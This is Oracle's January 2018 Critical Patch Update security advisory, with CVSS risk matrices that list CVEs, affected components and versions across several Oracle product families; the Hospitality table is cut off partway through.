Critical Patch Updates are released on the Tuesday closest to the 17th day of January, April, July and October. The next four dates are:

* 17 April 2018
* 17 July 2018
* 16 October 2018
* 15 January 2019

### References

* [Oracle Critical Patch Updates, Security Alerts and Bulletins](/security-alerts/)
* [Critical Patch Update - January 2018 Documentation Map](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2318499.1)
* [Oracle Critical Patch Updates and Security Alerts - Frequently Asked Questions](/security-alerts/cpufaq.html)
* [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)
* [Use of Common Vulnerability Scoring System (CVSS) by Oracle](/security-alerts/cvssscoringsystem.html)
* [English text version of the risk matrices](/security-alerts/cpujan2018verbose.html)
* [CVRF XML version of the risk matrices](/docs/tech/security-alerts/4110638.xml)
* [Map of CVE to Advisory](/security-alerts/public-vuln-to-advisory-mapping.html)
* [Software Error Correction Support Policy](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1)

### Modification History

| Date | Note |
| --- | --- |
| 2018-March-20 | Rev 8. Credit Statement Update. |
| 2018-March-1 | Rev 7. Added note concerning patching of dependent Oracle products. |
| 2018-February-12 | Rev 6. Updated versions affected by CVE-2018-2575. |
| 2018-February-05 | Rev 5. On-Line Presence Security Contributors Update. |
| 2018-January-22 | Rev 4. Corrected list of additional CVEs associated with CVE-2016-2179 and CVE-2017-3732 in Fusion Middleware Risk Matrix and updated Credit Statement. |
| 2018-January-19 | Rev 3. Credit Statement Update. |
| 2018-January-18 | Rev 2. Clarify product naming and version for Retail product. |
| 2018-January-16 | Rev 1. Initial Release. |

### Oracle Database Server Risk Matrix

This Critical Patch Update contains 5 new security fixes for the Oracle Database Server. 3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. 1 of these fixes is applicable to client-only installations, i.e., installations that do not have the Oracle Database Server installed. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#DB).

| CVE# | Component | Package and/or Privilege Required | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-10282 | Core RDBMS | Create Session, Execute Catalog Role | Oracle Net | No | 9.1 | Network | Low | High | None | Changed | High | High | High | 12.1.0.2, 12.2.0.1 |  |
| CVE-2018-2680 | Java VM | Create Session, Create Procedure | Multiple | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.2.0.4, 12.1.0.2, 12.2.0.1 |  |
| CVE-2017-12617 | WLM (Apache Tomcat) | None | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 12.2.0.1 |  |
| CVE-2018-2699 | Application Express | None | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | Prior to 5.1.4.00.08 |  |
| CVE-2018-2575 | Core RDBMS | Local Logon | Multiple | No | 2.0 | Network | High | High | Required | Un- changed | Low | None | None | 11.2.0.4, 12.1.0.2, 12.2.0.1 | See Note 1 |

#### Notes:

1. Applicable only to Windows platform.

#### Oracle Database Server Client-Only Installations

The following Oracle Database Server vulnerability included in this Critical Patch Update affects client-only installations: CVE-2018-2575.

### Oracle Communications Applications Risk Matrix

This Critical Patch Update contains 10 new security fixes for Oracle Communications Applications. 8 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#CGBU).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2015-3253 | Oracle Communications BRM - Elastic Charging Engine | Security (Apache Groovy) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 7.5 |  |
| CVE-2017-5645 | Oracle Communications BRM - Elastic Charging Engine | Security (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 7.5 |  |
| CVE-2017-5645 | Oracle Communications Convergent Charging Controller | Notifications Gateway (Apache Log4j) | TCP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.0 |  |
| CVE-2017-5645 | Oracle Communications Network Charging and Control | Notifications Gateway (Apache Log4j) | TCP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.0 |  |
| CVE-2017-5645 | Oracle Communications Services Gatekeeper | Security (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 5.1, 6.0 |  |
| CVE-2016-5385 | Oracle Communications User Data Repository | Security (PM&C) | Multiple | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 10.x, 12.x |  |
| CVE-2018-2570 | Oracle Communications Unified Inventory Management | Portal | HTTP | No | 6.3 | Network | Low | Low | None | Un- changed | Low | Low | Low | 7.2.4.2.x, 7.3 |  |
| CVE-2018-2567 | Oracle Communications Order and Service Management | Portal | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 7.2.4.1.x, 7.2.4.2.x, 7.3.0.x.x, 7.3.0.1.x |  |
| CVE-2013-2566 | Oracle Communications Application Session Controller | Security | TLS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 3.x |  |
| CVE-2018-2571 | Oracle Communications Unified Inventory Management | Portal | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 7.2.4.2.x, 7.3 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2013-2566 also addresses CVE-2015-2808.
* The fix for CVE-2015-3253 also addresses CVE-2016-6814.
* The fix for CVE-2016-5385 also addresses CVE-2016-2518, CVE-2016-2550, CVE-2016-4449, CVE-2016-5387 and CVE-2016-7977.

### Oracle Construction and Engineering Suite Risk Matrix

This Critical Patch Update contains 1 new security fix for the Oracle Construction and Engineering Suite. This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#PVA).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2620 | Primavera Unifier | Platform | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 10.x, 15.x, 16.x, 17.x |  |

### Oracle E-Business Suite Risk Matrix

This Critical Patch Update contains 7 new security fixes for the Oracle E-Business Suite. 4 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#EBS).

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the January 2018 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (January 2018), [My Oracle Support Note 2334374.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2334374.1).

| CVE# | Product | component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2656 | Oracle General Ledger | Data Manager Server | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | High | None | 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |
| CVE-2018-2655 | Oracle Work in Process | Assemble/Configure to Order | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | High | None | 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |
| CVE-2017-3736 | Application Server | Tech Stack (OpenSSL) | HTTPS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 12.1.3 |  |
| CVE-2018-2691 | Oracle User Management | Proxy User Delegation | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |
| CVE-2018-2684 | Oracle User Management | Registration Process | HTTP | No | 4.9 | Network | Low | High | None | Un- changed | High | None | None | 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |
| CVE-2018-2635 | Oracle Application Object Library | Login | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |
| CVE-2018-2580 | Oracle Applications DBA | ADPatch | None | No | 4.4 | Local | Low | High | None | Un- changed | High | None | None | 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-3736 also addresses CVE-2017-3735.

### Oracle Financial Services Applications Risk Matrix

This Critical Patch Update contains 34 new security fixes for Oracle Financial Services Applications. 13 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#IFLX).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2706 | Oracle Banking Corporate Lending | Core module | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 12.3.0, 12.4.0 |  |
| CVE-2018-2705 | Oracle Banking Payments | Payments Core | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 12.3.0, 12.4.0 |  |
| CVE-2018-2648 | Oracle FLEXCUBE Universal Banking | Infrastructure | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 11.3.0, 11.4.0, 12.0.1, 12.0.2, 12.0.3, 12.1.0, 12.2.0, 12.3.0, 12.4.0 |  |
| CVE-2018-2707 | Oracle Banking Corporate Lending | Core module | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | None | High | High | 12.3.0, 12.4.0 |  |
| CVE-2018-2704 | Oracle Banking Payments | Payments Core | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | None | High | High | 12.3.0, 12.4.0 |  |
| CVE-2018-2723 | Oracle Financial Services Asset Liability Management | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 6.1.x, 8.0.x |  |
| CVE-2018-2592 | Oracle Financial Services Balance Sheet Planning | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.x |  |
| CVE-2018-2729 | Oracle Financial Services Funds Transfer Pricing | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 6.1.x, 8.0.x |  |
| CVE-2018-2725 | Oracle Financial Services Hedge Management and IFRS Valuations | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.x |  |
| CVE-2018-2720 | Oracle Financial Services Liquidity Risk Management | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.x |  |
| CVE-2018-2724 | Oracle Financial Services Loan Loss Forecasting and Provisioning | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.x |  |
| CVE-2018-2726 | Oracle Financial Services Market Risk | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.x |  |
| CVE-2018-2727 | Oracle Financial Services Market Risk Measurement and Management | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.5 |  |
| CVE-2018-2721 | Oracle Financial Services Price Creation and Discovery | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.0.5 |  |
| CVE-2018-2679 | Oracle Financial Services Profitability Management | User Interface | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 6.1.x, 8.0.x |  |
| CVE-2018-2649 | Oracle FLEXCUBE Universal Banking | Infrastructure | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | None | High | High | 11.3.0, 11.4.0, 12.0.1, 12.0.2, 12.0.3, 12.1.0, 12.2.0, 12.3.0, 12.4.0 |  |
| CVE-2018-2660 | Oracle Financial Services Analytical Applications Infrastructure | Core | HTTP | No | 7.4 | Network | Low | Low | None | Changed | Low | Low | Low | 7.3.5.x, 8.0.x |  |
| CVE-2018-2661 | Oracle Financial Services Analytical Applications Infrastructure | Core | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 7.3.5.x, 8.0.x |  |
| CVE-2018-2732 | Oracle Financial Services Analytical Applications Reconciliation Framework | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2692 | Oracle Financial Services Asset Liability Management | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 6.1.x, 8.0.x |  |
| CVE-2018-2626 | Oracle Financial Services Balance Sheet Planning | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2728 | Oracle Financial Services Funds Transfer Pricing | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 6.1.x, 8.0.x |  |
| CVE-2018-2719 | Oracle Financial Services Hedge Management and IFRS Valuations | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2682 | Oracle Financial Services Liquidity Risk Management | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2712 | Oracle Financial Services Loan Loss Forecasting and Provisioning | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2714 | Oracle Financial Services Market Risk | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.x |  |
| CVE-2018-2716 | Oracle Financial Services Market Risk Measurement and Management | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.5 |  |
| CVE-2018-2722 | Oracle Financial Services Price Creation and Discovery | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.5 |  |
| CVE-2018-2670 | Oracle Financial Services Profitability Management | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 6.1.x, 8.0.x |  |
| CVE-2018-2674 | Oracle FLEXCUBE Direct Banking | Logoff | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.0.2, 12.0.3 |  |
| CVE-2018-2630 | Oracle FLEXCUBE Universal Banking | Security Management System | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 11.5.0, 11.6.0, 11.7.0 |  |
| CVE-2018-2709 | Oracle Banking Corporate Lending | Core module | HTTP | No | 5.3 | Network | High | Low | None | Un- changed | High | None | None | 12.3.0, 12.4.0 |  |
| CVE-2018-2708 | Oracle Banking Payments | Payments Core | HTTP | No | 5.3 | Network | High | Low | None | Un- changed | High | None | None | 12.3.0, 12.4.0 |  |
| CVE-2018-2614 | Oracle FLEXCUBE Universal Banking | Infrastructure | HTTP | No | 5.3 | Network | High | Low | None | Un- changed | High | None | None | 11.3.0, 11.4.0, 12.0.1, 12.0.2, 12.0.3, 12.1.0, 12.2.0, 12.3.0, 12.4.0 |  |

### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 27 new security fixes for Oracle Fusion Middleware. 21 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#FMW).

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security fixes are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the January 2018 Critical Patch Update to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2018 Patch Availability Document for Oracle Products, [My Oracle Support Note 2325393.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-10352 | Oracle WebLogic Server | WLS - Web Services | HTTP | Yes | 9.9 | Network | Low | None | None | Changed | Low | Low | High | 12.2.1.3.0 |  |
| CVE-2017-5461 | Oracle Directory Server Enterprise Edition | Admin Console (Sun Security Libraries) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 11.1.1.7.0 |  |
| CVE-2017-5461 | Oracle iPlanet Web Server | Security (NSS) | Multiple | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 7.0 |  |
| CVE-2017-5645 | Oracle WebLogic Server | Sample apps (Apache Log4j) | TCP/UDP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 10.3.6.0.0, 12.1.3.0.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2016-0635 | Oracle Identity Manager | Security | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 11.1.2.3.0 |  |
| CVE-2015-7501 | Oracle Identity Manager Connector | CA ACF2 (Apache Commons Collections) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 9.0.4.20.6, 9.0.4.21.0, 9.0.4.25.4 |  |
| CVE-2015-7501 | Oracle Identity Manager | Security (Apache Commons Collections) | HTTP | Yes | 8.6 | Network | Low | None | None | Un- changed | High | Low | Low | 11.1.2.3.0 |  |
| CVE-2017-10068 | Oracle Business Intelligence Enterprise Edition | Analytics Web Dashboards | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | High | Low | None | 12.2.1.3.0 |  |
| CVE-2018-2711 | Oracle JDeveloper | Security Framework | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | High | Low | None | 11.1.1.2.4, 11.1.1.7.0, 11.1.1.7.1, 11.1.1.9.0, 12.1.3.0.0 |  |
| CVE-2016-2107 | Oracle Mobile Security Suite | Internal Development (OpenSSL) | HTTPS | Yes | 8.2 | Network | Low | None | None | Un- changed | Low | None | High | 3.0.1 |  |
| CVE-2018-2564 | Oracle WebCenter Content | Content Server | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | Low | High | None | 11.1.1.9.0 |  |
| CVE-2018-2596 | Oracle WebCenter Content | Content Server | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | Low | High | None | 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2016-1182 | Oracle WebCenter Portal | Security Framework (Apache Struts 1) | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | None | Low | High | 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2018-2713 | Oracle WebCenter Portal | WebCenter Spaces Application | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | Low | High | None | 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2017-12617 | Oracle Endeca Information Discovery Integrator | Other Issues (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 3.1.0, 3.2.0 |  |
| CVE-2017-12617 | Oracle Tuxedo System and Applications Monitor | tsam-General (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 12.1.3.0.0 |  |
| CVE-2018-2601 | Oracle Internet Directory | Oracle Directory Services Manager | HTTP | No | 8.0 | Network | High | High | None | Changed | High | High | High | 11.1.1.7.0, 11.1.1.9.0, 12.2.1.3.0 |  |
| CVE-2017-9798 | Oracle HTTP Server | Web Listener | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 11.1.1.7.0, 11.1.1.9.0, 12.1.3.0.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2015-7940 | Oracle WebCenter Portal | Security Framework (Bouncy Castle Java package) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2018-2715 | Oracle Business Intelligence Enterprise Edition | BI Platform Security | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2017-10262 | Oracle Access Manager | Web Server Plugin | HTTPS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 11.1.2.3.0 |  |
| CVE-2017-3732 | Oracle Access Manager | Web Server Plugin (OpenSSL) | HTTPS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 10.1.4.3.0 |  |
| CVE-2016-2179 | Oracle Business Intelligence Enterprise Edition | Analytics Server (OpenSSL) | HTTPS | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | 11.1.1.7.0, 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2018-2561 | Oracle HTTP Server | Web Listener | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | 11.1.1.7.0, 11.1.1.9.0, 12.1.3.0.0, 12.2.1.2.0, 12.2.1.3.0 |  |
| CVE-2018-2625 | Oracle WebLogic Server | Web Services | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.2.0 |  |
| CVE-2017-10273 | Oracle JDeveloper | Deployment | None | No | 4.7 | Local | High | High | Required | Changed | Low | Low | Low | 11.1.1.7.0, 11.1.1.7.1, 11.1.1.9.0, 11.1.2.4.0, 12.1.3.0.0, 12.2.1.2.0 |  |
| CVE-2018-2584 | Oracle WebCenter Sites | Advanced UI | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | Low | None | None | 11.1.1.8.0 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2015-7501 also addresses CVE-2015-4852.
* The fix for CVE-2016-1182 also addresses CVE-2014-0114 and CVE-2016-1181.
* The fix for CVE-2016-2107 also addresses CVE-2016-2105, CVE-2016-2106 and CVE-2016-2109.
* The fix for CVE-2016-2179 also addresses CVE-2016-2107, CVE-2016-2177, CVE-2016-2178, CVE-2016-2180, CVE-2016-2181, CVE-2016-2182, CVE-2016-2183, CVE-2016-6302, CVE-2016-6303, CVE-2016-6304, CVE-2016-6306, CVE-2016-7052, CVE-2016-7055, CVE-2017-3731 and CVE-2017-3732.
* The fix for CVE-2017-3732 also addresses CVE-2016-2177, CVE-2016-2178, CVE-2016-2180, CVE-2016-2181, CVE-2016-2182, CVE-2016-2183, CVE-2016-6302, CVE-2016-6303, CVE-2016-6304, CVE-2016-6306, CVE-2016-7052, CVE-2016-7055 and CVE-2017-3731.
* The fix for CVE-2018-2561 also addresses CVE-2007-6750.

### Oracle Health Sciences Applications Risk Matrix

This Critical Patch Update contains 7 new security fixes for Oracle Health Sciences Applications. 5 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#HCAR).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2613 | Oracle Argus Safety | Login | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | High | Low | None | 7.x, 8.0.x, 8.1 |  |
| CVE-2018-2642 | Oracle Argus Safety | File Upload | HTTP | No | 6.5 | Network | Low | Low | Required | Changed | Low | Low | Low | 7.x, 8.0.x |  |
| CVE-2018-2643 | Oracle Argus Safety | Case Selection | HTTP | No | 6.4 | Network | Low | Low | None | Changed | Low | Low | None | 7.x, 8.0.x |  |
| CVE-2018-2644 | Oracle Argus Safety | Worklist | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 7.x, 8.0.x, 8.1 |  |
| CVE-2017-9072 | Oracle Health Sciences Empirica Inspections | UI (Calendar) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 1.0.1.1 |  |
| CVE-2017-9072 | Oracle Health Sciences Empirica Signal | UI (Calendar) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.1.0 |  |
| CVE-2017-12617 | Oracle Health Sciences Empirica Inspections | Base (Apache Tomcat) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 1.0.1.1 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-12617 also addresses CVE-2017-5664.

### Oracle Hospitality Applications Risk Matrix

This Critical Patch Update contains 21 new security fixes for Oracle Hospitality Applications. 15 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#HOSP).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2697 | Oracle Hospitality Cruise Fleet Management | Emergency Response System | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | High | None | 9.0.4.0 |  |
| CVE-2017-0781 | MICROS Handheld Terminal | MC40 Zebra Handheld unit | Bluetooth | Yes | 8.8 | Adjacent Network | Low | None | None | Un- changed | High | High | High | Prior to BSP 02.13.0701 (070116) |  |
| CVE-2018-2608 | Oracle Hospitality Simphony | Security | HTTP | Yes | 8.6 | Network | Low | None | None | Changed | High | None | None | 2.7 |  |
| CVE-2018-2597 | Oracle Hospitality Cruise Dining Room Management | SilverWhere | HTTP | Yes | 8.2 | Network | Low | None | Required | Changed | High | Low | None | 8.0.78 |  |
| CVE-2018-2621 | Oracle Hospitality Cruise Shipboard Property Management System | Mobile Gangway and Mustering | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | High | Low | None | 7.3.874 |  |
| CVE-2017-13077 | MICROS Handheld Terminal | MC40 Zebra Handheld unit | WiFi | Yes | 8.1 | Adjacent Network | Low | None | None | Un- changed | High | High | None | Prior to BSP 02.13.0701 (070116) |  |
| CVE-2017-12617 | Oracle Hospitality Guest Access | Base (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 4.2.0, 4.2.1 |  |
| CVE-2018-2666 | Oracle Hospitality Labor Management | Webservice Endpoint | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 8.5.1, 9.0.0 |  |
| CVE-2018-2636 | Oracle Hospitality Simphony | Security | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 2.7, 2.8, 2.9 |  |
| CVE-2018-2701 | Oracle Hospitality Cruise Fleet Management | Emergency Response System | HTTP | No | 7.6 | Network | Low | Low | Required | Changed | High | Low | None | 9.0.4.0 |  |
| CVE-2018-2700 | Oracle Hospitality Cruise Fleet Management | Emergency Response System | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 9.0.4.0 |  |
